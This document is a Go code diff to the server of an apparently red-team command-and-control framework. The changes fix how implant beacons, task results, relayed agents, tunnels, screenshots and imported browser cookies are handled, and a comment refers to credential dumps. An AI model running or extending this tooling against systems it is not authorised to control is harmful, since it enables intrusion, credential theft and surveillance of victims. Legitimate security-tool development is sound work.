@@ -86,6 +86,9 @@ type taskResult struct {
 	// processing of re-sent results (dropped frames are retried with a new
 	// envelope seq, so dedupe on this instead).
 	ResultID string `json:"rid,omitempty"`
+	// Partial marks a streaming progress chunk for a running task (appended
+	// to a capped tail instead of finalising the task).
+	Partial bool `json:"partial,omitempty"`
 	// MAC is the agent's file-transfer integrity chain link (hex).
 	MAC string `json:"mac,omitempty"`
 	// EncryptedWithTaskKey flags that Output was sealed with the per-task key.
@@ -416,7 +419,12 @@ func (s *Server) decodeBeaconEnvelope(raw []byte) (envelope beaconEnvelope, req 
 		accepted := s.acceptSeq(envelope.UUID, envelope.Seq)
 		if !accepted {
 			slog.Warn("Beacon rejected: replay or out-of-order seq", "agent_id", envelope.UUID, "seq", envelope.Seq)
-			return beaconEnvelope{}, beaconRequest{}, frameRejected
+			// Return the PARSED envelope, not the zero value: the caller's
+			// resync gate keys on env.CipherB64 != "" to distinguish "could
+			// not decrypt at all" from "decrypt ok but sequence behind" —
+			// only the latter gets the MAC-signed resync response that lets
+			// a desynced agent fast-forward instead of being locked out.
+			return envelope, beaconRequest{}, frameRejected
 		}
 
 		maxPayload := s.effectiveMaxPayload()
@@ -430,7 +438,9 @@ func (s *Server) decodeBeaconEnvelope(raw []byte) (envelope beaconEnvelope, req 
 		}
 		req.UUID = envelope.UUID
 		req.Seq = envelope.Seq
-		s.sessionManager.IncrementMessageCount(envelope.UUID)
+		// NOTE: no explicit IncrementMessageCount here — DecryptWithAADB64
+		// already advances the counter internally; the extra call made
+		// MessageCount grow ~2× and fired rekey twice as early as intended.
 		return envelope, req, frameEncrypted
 	}
 
@@ -545,6 +555,10 @@ func (s *Server) processAuthFrame(env beaconEnvelope, kind beaconFrameKind) ([]b
 	needRegister := kind == frameRegister || !imp.Registered
 
 	if needRegister && kind == frameHandshake {
+		if s.sessionManager == nil {
+			slog.Warn("Beacon auth rejected: session manager unavailable", "agent_id", env.UUID)
+			return nil, false
+		}
 		// v3 recovery path: the handshake MAC proves the per-implant secret, but
 		// a handshake frame carries no identity key, so the server cannot bind
 		// the identity. Signal the agent to re-enroll with a fresh registration
@@ -619,6 +633,10 @@ func (s *Server) processAuthFrame(env beaconEnvelope, kind beaconFrameKind) ([]b
 		}
 	}
 
+	if s.sessionManager == nil {
+		slog.Warn("Beacon auth rejected: session manager unavailable", "agent_id", env.UUID)
+		return nil, false
+	}
 	serverPub := base64.StdEncoding.EncodeToString(s.sessionManager.GetPublicKey())
 	resp := beaconResponse{
 		ProtocolVersion: protocol.CurrentProtocolVersion,
@@ -912,6 +930,21 @@ func (s *Server) processAgentRegistration(req beaconRequest, publicIP string, no
 	result := s.db.Unscoped().Where("id = ?", req.UUID).First(&agent)
 	isNewAgent := result.Error == gorm.ErrRecordNotFound
 
+	if !isNewAgent && agent.Blocked {
+		// Force-offline: refuse all service to this implant. Returning no
+		// agent makes the caller emit a well-formed but taskless reply, so the
+		// wire protocol is unaffected while nothing is delivered or accepted.
+		// Unlike soft-delete, a blocked row is never restored by beaconing;
+		// every attempt lands in the audit trail for forensics.
+		if uerr := s.db.Model(&db.Implant{}).Where("id = ?", agent.ID).Update("status", "offline").Error; uerr != nil {
+			slog.Error("Failed to pin blocked agent offline", "agent_id", agent.ID, "error", uerr)
+		}
+		s.LogAuditRecord(nil, "blocked_agent_checkin", "agent", agent.ID,
+			"blocked implant attempted check-in"+blockedReasonSuffix(agent.BlockedReason), false, nil)
+		slog.Debug("Rejected blocked agent check-in", "agent_id", agent.ID, "reason", agent.BlockedReason)
+		return db.Implant{}, false
+	}
+
 	if !isNewAgent && agent.DeletedAt.Valid {
 		// Agent was removed from the UI but is beaconing again: restore the
 		// tombstone (un-delete) rather than leaving a row that blocks re-registration.
@@ -1047,10 +1080,10 @@ func (s *Server) processAgentRegistration(req beaconRequest, publicIP string, no
 		if pid := parseInt("pid"); pid > 0 {
 			updates["pid"] = pid
 		}
-		if interval := parseInt("interval"); interval >= 0 {
+		if interval := parseInt("interval"); interval >= 1 && interval <= 86400 {
 			updates["current_interval"] = interval
 		}
-		if jitter := parseInt("jitter"); jitter >= 0 {
+		if jitter := parseInt("jitter"); jitter >= 0 && jitter <= 100 {
 			updates["current_jitter"] = jitter
 		}
 		if req.Info != nil {
@@ -1148,6 +1181,21 @@ func (s *Server) processAgentRegistration(req beaconRequest, publicIP string, no
 	return agent, isNewAgent
 }
 
+// taskResultTailCap bounds the streaming tail persisted for a running task
+// so a chatty long-running command cannot grow the DB without limit. The
+// final result overwrites this wholesale on completion.
+const taskResultTailCap = 64 << 10
+
+// appendTaskResultTail appends one partial chunk to the task's stored output,
+// keeping at most the last taskResultTailCap bytes.
+func appendTaskResultTail(task *db.Task, chunk string) {
+	combined := task.Result + chunk
+	if len(combined) > taskResultTailCap {
+		combined = combined[len(combined)-taskResultTailCap:]
+	}
+	task.Result = combined
+}
+
 func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid string, now time.Time) {
 	// Batch-load all referenced tasks
 	taskIDs := make([]uint, 0, len(results))
@@ -1200,6 +1248,11 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 			}
 			continue
 		}
+		if r.Type == "screen_trigger" && r.Output != "" {
+			s.writeScreenshotFile(s.cfg.Server.DataDir, uuid, r.TaskID, r.Output)
+			s.BroadcastScreenshot(uuid, r.Output)
+			continue
+		}
 
 		slog.Info("Processing task result", "task_id", r.TaskID, "type", r.Type, "has_output", r.Output != "", "has_error", r.Error != "", "error_message", r.Error)
 
@@ -1209,10 +1262,11 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 		}
 		// Finality guard (P6): a cancelled task is terminal. The agent may have
 		// run the command before the abort reached it; its result must not
-		// resurrect the task row.
+		// resurrect the task row. The pending slot was already released by
+		// whoever cancelled the task (cancel endpoint / kill-switch disarm) —
+		// decrementing here double-counted the release.
 		if task.Status == "cancelled" {
 			slog.Info("Result for cancelled task dropped", "agent_id", uuid, "task_id", r.TaskID, "type", r.Type)
-			s.decrementPendingTasks(uuid)
 			continue
 		}
 		// Durable idempotency (P8): the agent reseeds results with the same rid
@@ -1227,17 +1281,62 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 			acknowledgedAt := now
 			task.AcknowledgedAt = &acknowledgedAt
 		}
-		task.Status = "completed"
+
+		// Streaming progress chunk: grow the stored output tail and keep the
+		// task in "running". The final (non-partial) result overwrites the
+		// value wholesale and runs the normal finalisation path below.
+		if r.Partial {
+			// Terminal-state guard: a late/retried partial chunk (fresh rid,
+			// reordered delivery) must not clobber the FINAL output of an
+			// already-finalised task — that destroyed e.g. completed creds
+			// dumps with a 64KB tail. Only live tasks accept tails.
+			switch task.Status {
+			case "pending", "running", "sent":
+			default:
+				slog.Debug("Partial chunk dropped: task already finalised", "agent_id", uuid, "task_id", r.TaskID, "status", task.Status)
+				continue
+			}
+			appendTaskResultTail(task, r.Output)
+			task.UpdatedAt = now
+			if uerr := s.db.Model(&db.Task{}).Where("id = ?", task.ID).
+				Updates(map[string]interface{}{"result": task.Result, "updated_at": now}).Error; uerr != nil {
+				slog.Error("Failed to persist partial task output", "agent_id", uuid, "task_id", r.TaskID, "error", uerr)
+			}
+			s.broadcastTaskUpdate(uuid, *task)
+			continue
+		}
+
+		// Atomic first-final-wins claim: chunked transfers (upload/download)
+		// deliver many final-shaped results per task ID. Without this guard
+		// every chunk re-finalised the task and drained another pending-slot
+		// from agentPendingTasks, zeroing MaxPendingTasksPerAgent and letting
+		// that agent bypass the anti-flood gate entirely.
+		finalStatus := "completed"
 		if r.Error != "" {
-			task.Status = "failed"
+			finalStatus = "failed"
+		}
+		claim := s.db.Model(&db.Task{}).
+			Where("id = ? AND status IN ?", task.ID, []string{"pending", "running", "sent"}).
+			Update("status", finalStatus)
+		if claim.Error != nil {
+			slog.Error("Failed to claim task finality", "agent_id", uuid, "task_id", r.TaskID, "error", claim.Error)
+			continue
+		}
+		if claim.RowsAffected == 0 {
+			// Already terminal (duplicate/replayed result): drop silently.
+			slog.Debug("Duplicate terminal result dropped (finality claim)", "agent_id", uuid, "task_id", r.TaskID, "rid", r.ResultID)
+			continue
+		}
+		task.Status = finalStatus
+		if r.Error != "" {
 			task.Error = r.Error
 		}
 		task.UpdatedAt = now
 
-		// Decrement per-agent pending task counter (delete key at zero to avoid leak)
+		// Decrement per-agent pending task counter (delete key at zero to avoid leak) —
+		// reached exactly once per task thanks to the claim above.
 		s.decrementPendingTasks(uuid)
-
-		// For monitoring control tasks, do not retain them in DB at all
+		s.fileChains.reset(task.ID)
 		if r.Type == "screen_stream_start" || r.Type == "screen_stream_stop" {
 			task.Result = "processed"
 			s.broadcastTaskUpdate(uuid, *task)
@@ -1300,12 +1399,12 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 			parts := strings.Split(task.Command, ",")
 			sleepUpdates := map[string]interface{}{}
 			if len(parts) >= 1 {
-				if v, err := strconv.Atoi(strings.TrimSpace(parts[0])); err == nil {
+				if v, err := strconv.Atoi(strings.TrimSpace(parts[0])); err == nil && v >= 1 && v <= 86400 {
 					sleepUpdates["current_interval"] = v
 				}
 			}
 			if len(parts) >= 2 {
-				if v, err := strconv.Atoi(strings.TrimSpace(parts[1])); err == nil {
+				if v, err := strconv.Atoi(strings.TrimSpace(parts[1])); err == nil && v >= 0 && v <= 100 {
 					sleepUpdates["current_jitter"] = v
 				}
 			}
@@ -1389,6 +1488,10 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 			s.parseAndStoreCredCheckResult(uuid, *task, task.Result)
 		}
 
+		if r.Type == "cookie_export" && task.Status == "completed" && task.Result != "" {
+			s.ingestCookieExport(uuid, task.Result)
+		}
+
 		// Result size cap is enforced before parsing (see above); screenshots
 		// are exempt from the cap.
 		// Encrypt Result/Error at rest (H3): build a DB copy so the in-memory
@@ -1466,19 +1569,21 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 						slog.Error("Plugin hook panicked", "agent_id", uuid, "recover", r)
 					}
 				}()
-				ctx, cancel := context.WithTimeout(s.ctx, PluginHookTimeout)
-				defer cancel()
-				s.pluginManager.ExecuteHook(ctx, plugin.Event{
-					Type:      plugin.EventTaskCompleted,
-					Timestamp: now,
-					AgentID:   uuid,
-					Payload: map[string]interface{}{
-						"task_id":   task.ID,
-						"task_type": task.Type,
-						"status":    task.Status,
-						"error":     task.Error,
-					},
-				})
+			ctx, cancel := context.WithTimeout(s.ctx, PluginHookTimeout)
+			defer cancel()
+			if err := s.pluginManager.ExecuteHook(ctx, plugin.Event{
+				Type:      plugin.EventTaskCompleted,
+				Timestamp: now,
+				AgentID:   uuid,
+				Payload: map[string]interface{}{
+					"task_id":   task.ID,
+					"task_type": task.Type,
+					"status":    task.Status,
+					"error":     task.Error,
+				},
+			}); err != nil {
+				slog.Warn("Hook errors on task_completed event", "agent_id", uuid, "task_id", task.ID, "err", err)
+			}
 			}()
 		}
 
@@ -1632,13 +1737,11 @@ func (s *Server) processRelayedResults(relayed []relayedData, parentUUID string,
 			if !ok || !strings.EqualFold(task.AgentID, rd.AgentID) {
 				continue
 			}
-			// Finality guard (P6): a cancelled task is terminal even for relayed
-			// children; the result must not resurrect the row.
+			// Finality guard: cancelled is terminal even for relayed children
 			if task.Status == "cancelled" {
-				s.decrementPendingTasks(rd.AgentID)
 				continue
 			}
-			// Durable idempotency (P8): exact rid already applied once.
+			// Durable idempotency: exact rid already applied once.
 			if r.ResultID != "" && task.LastResultID == r.ResultID && (task.Status == "completed" || task.Status == "failed") {
 				continue
 			}
@@ -1648,9 +1751,6 @@ func (s *Server) processRelayedResults(relayed []relayedData, parentUUID string,
 				task.Error = r.Error
 			}
 			task.UpdatedAt = now
-
-			// Decrement per-agent pending task counter (delete key at zero to avoid leak)
-			s.decrementPendingTasks(rd.AgentID)
 			if r.ResultID != "" {
 				task.LastResultID = r.ResultID
 			}
@@ -1667,9 +1767,20 @@ func (s *Server) processRelayedResults(relayed []relayedData, parentUUID string,
 			if len(task.Result) > MaxResultSize {
 				task.Result = truncateString(task.Result, MaxResultSize)
 			}
-			if err := s.db.Save(task).Error; err != nil {
-				slog.Error("Failed to save relayed task result", "task_id", task.ID, "child", rd.AgentID, "error", err)
+			task.EncryptTaskFields()
+			// Atomic first-final-wins: only pending/running/sent can transition to final
+			res := s.db.Model(&db.Task{}).Where("id = ? AND status IN ?", task.ID, []string{"pending", "running", "sent"}).Updates(map[string]interface{}{
+				"status": task.Status, "result": task.Result, "error": task.Error, "last_result_id": task.LastResultID,
+			})
+			if res.Error != nil {
+				slog.Error("Failed to save relayed task result", "task_id", task.ID, "child", rd.AgentID, "error", res.Error)
+				continue
 			}
+			if res.RowsAffected == 0 {
+				continue
+			}
+			s.decrementPendingTasks(rd.AgentID)
+			s.fileChains.reset(task.ID)
 			s.broadcastTaskUpdate(rd.AgentID, *task)
 			slog.Info("P2P relayed task result processed", "child", rd.AgentID, "task_id", r.TaskID)
 		}
@@ -1790,7 +1901,8 @@ func (s *Server) bindRelayChildToParent(childID, parentUUID string) bool {
 				return false
 			}
 			if agent.ParentID == "" {
-				s.db.Unscoped().Model(&db.Implant{}).Where("id = ?", childID).Update("parent_id", parentUUID)
+				res := s.db.Unscoped().Model(&db.Implant{}).Where("id = ? AND (parent_id = '' OR parent_id IS NULL)", childID).Update("parent_id", parentUUID)
+				return res.Error == nil && res.RowsAffected == 1
 			}
 			return true
 		}
@@ -1804,7 +1916,8 @@ func (s *Server) bindRelayChildToParent(childID, parentUUID string) bool {
 		s.db.Unscoped().Model(&db.Implant{}).Where("id = ?", childID).Update("deleted_at", nil)
 	}
 	if agent.ParentID == "" {
-		return s.db.Unscoped().Model(&db.Implant{}).Where("id = ?", childID).Update("parent_id", parentUUID).Error == nil
+		res := s.db.Unscoped().Model(&db.Implant{}).Where("id = ? AND (parent_id = '' OR parent_id IS NULL)", childID).Update("parent_id", parentUUID)
+		return res.Error == nil && res.RowsAffected == 1
 	}
 	return agent.ParentID == parentUUID
 }
@@ -1825,6 +1938,7 @@ func (s *Server) fetchPendingTasks(uuid string, limits ...int) []task {
 		var pending []db.Task
 		if err := tx.Clauses(clause.Locking{Strength: "UPDATE"}).
 			Where("agent_id = ? AND status = ?", uuid, "pending").
+			Where("NOT (type = ? AND (mac = '' OR mac IS NULL))", "upload").
 			Order("priority DESC, created_at ASC").
 			Limit(limit).
 			Find(&pending).Error; err != nil {
@@ -1848,10 +1962,11 @@ func (s *Server) fetchPendingTasks(uuid string, limits ...int) []task {
 		if result.Error != nil {
 			return result.Error
 		}
-		if result.RowsAffected != int64(len(ids)) {
-			return fmt.Errorf("task claim conflict for agent %s", uuid)
+		if result.RowsAffected < int64(len(ids)) {
+			slog.Debug("Some tasks already claimed by concurrent connection", "agent_id", uuid, "attempted", len(ids), "claimed", result.RowsAffected)
 		}
-		return tx.Where("id IN ?", ids).Order("priority DESC, created_at ASC").Find(&claimedTasks).Error
+		return tx.Where("id IN ? AND status = ? AND claimed_by = ?", ids, "running", uuid).
+			Order("priority DESC, created_at ASC").Find(&claimedTasks).Error
 	}); err != nil {
 		slog.Error("Failed to claim pending tasks", "agent_id", uuid, "error", err)
 	}
@@ -1958,6 +2073,7 @@ func (s *Server) fetchRelayedChildTasks(parentUUID string) []relayedTask {
 		var pending []db.Task
 		if err := tx.Clauses(clause.Locking{Strength: "UPDATE"}).
 			Where("agent_id IN ? AND status = ?", childIDs, "pending").
+			Where("NOT (type = ? AND (mac = '' OR mac IS NULL))", "upload").
 			Order("priority DESC, created_at ASC").
 			Limit(BeaconTaskFetchLimit).
 			Find(&pending).Error; err != nil {
@@ -1975,7 +2091,11 @@ func (s *Server) fetchRelayedChildTasks(parentUUID string) []relayedTask {
 		}); result.Error != nil {
 			return result.Error
 		}
-		return tx.Where("id IN ?", ids).Order("priority DESC, created_at ASC").Find(&claimedTasks).Error
+		// Same claimed_by filter as fetchPendingTasks: SQLite silently drops
+		// FOR UPDATE row locks, so selecting all ids after the update could
+		// re-dispatch tasks another concurrent parent beacon had already won.
+		return tx.Where("id IN ? AND status = ? AND claimed_by = ?", ids, "running", parentUUID).
+			Order("priority DESC, created_at ASC").Find(&claimedTasks).Error
 	}); err != nil {
 		slog.Error("Failed to batch claim child tasks", "parent", parentUUID, "error", err)
 		return nil
@@ -2005,6 +2125,8 @@ func (s *Server) fetchRelayedChildTasks(parentUUID string) []relayedTask {
 				Data:    t.Data,
 				Offset:  t.Offset,
 				Size:    t.Size,
+				PrevMAC: t.PrevMAC,
+				MAC:     t.MAC,
 				Key:     t.TaskKey,
 			}
 			// Child tasks travel inside the parent's response, so their
@@ -2028,6 +2150,9 @@ func (s *Server) processSOCKSRelay(uuid string, socksData []socksFrame, resp *be
 			if strings.HasPrefix(f.Action, "rportfwd_") {
 				s.processRPortFwdData(uuid, f)
 			}
+			if strings.HasPrefix(f.Action, "lportfwd_") {
+				s.processLPortFwdData(uuid, f)
+			}
 		}
 	}
 	// Collect pending relay frames going TO the agent
@@ -2035,13 +2160,16 @@ func (s *Server) processSOCKSRelay(uuid string, socksData []socksFrame, resp *be
 		resp.SocksFrames = frames
 	}
 	// Hint agent to use fast polling when SOCKS is active
-	if s.hasActiveSocks(uuid) {
+	if s.hasActiveSocks(uuid) || (s.tunEngine != nil && s.tunEngine.active(uuid)) {
 		resp.SocksFastMode = true
 	}
 }
 
 // fireAgentConnectHook notifies plugins about an agent connection asynchronously.
 func (s *Server) fireAgentConnectHook(agent db.Implant, isNew bool, now time.Time) {
+	if isNew {
+		s.queueAutoRecon(agent)
+	}
 	if s.pluginManager == nil {
 		return
 	}
@@ -2057,7 +2185,7 @@ func (s *Server) fireAgentConnectHook(agent db.Implant, isNew bool, now time.Tim
 		}()
 		ctx, cancel := context.WithTimeout(s.ctx, PluginHookTimeout)
 		defer cancel()
-		s.pluginManager.ExecuteHook(ctx, plugin.Event{
+		if err := s.pluginManager.ExecuteHook(ctx, plugin.Event{
 			Type:      plugin.EventAgentConnect,
 			Timestamp: now,
 			AgentID:   agent.ID,
@@ -2068,7 +2196,9 @@ func (s *Server) fireAgentConnectHook(agent db.Implant, isNew bool, now time.Tim
 				"username": agent.Username,
 				"new":      isNew,
 			},
-		})
+		}); err != nil {
+			slog.Warn("Hook errors on agent_connect event", "agent_id", agent.ID, "err", err)
+		}
 	}()
 }
 
@@ -2138,6 +2268,11 @@ func beaconFingerprint(req beaconRequest) string {
 	for _, r := range req.Results {
 		h.Write([]byte(r.Type))
 		h.Write([]byte(strconv.FormatUint(uint64(r.TaskID), 10)))
+		h.Write([]byte(r.ResultID))
+		h.Write([]byte(r.MAC))
+		h.Write([]byte(r.Encoding))
+		h.Write([]byte(strconv.FormatBool(r.Partial)))
+		h.Write([]byte(strconv.FormatBool(r.EncryptedWithTaskKey)))
 		h.Write([]byte(r.Output))
 		h.Write([]byte(r.Error))
 		h.Write([]byte(r.Filename))
@@ -2304,6 +2439,10 @@ func (s *Server) saveScreenshot(dataDir, agentID string, taskID uint, b64Data st
 	if s.IsScreenMonitoring(agentID) {
 		return // do not retain files during live screen monitoring
 	}
+	s.writeScreenshotFile(dataDir, agentID, taskID, b64Data)
+}
+
+func (s *Server) writeScreenshotFile(dataDir, agentID string, taskID uint, b64Data string) {
 	if dataDir == "" {
 		dataDir = "data"
 	}
@@ -2570,7 +2709,11 @@ func (s *Server) executeTaskCallback(task db.Task, agentID string) {
 	req.Header.Set("Content-Type", "application/json")
 	req.Header.Set("User-Agent", "ForgeC2-Callback/1.0")
 
-	resp, err := s.httpClient.Do(req)
+	// ssrfSafeClient re-validates every redirect hop (P1-2): the plain
+	// httpClient silently follows up to 10 redirects with no per-hop check,
+	// letting an attacker URL 302 into cloud metadata / internal services
+	// and carries the task result payload there.
+	resp, err := ssrfSafeClient(s.httpClient).Do(req)
 	if err != nil {
 		slog.Error("Callback request failed", "task_id", task.ID, "url", task.CallbackURL, "error", err)
 		return
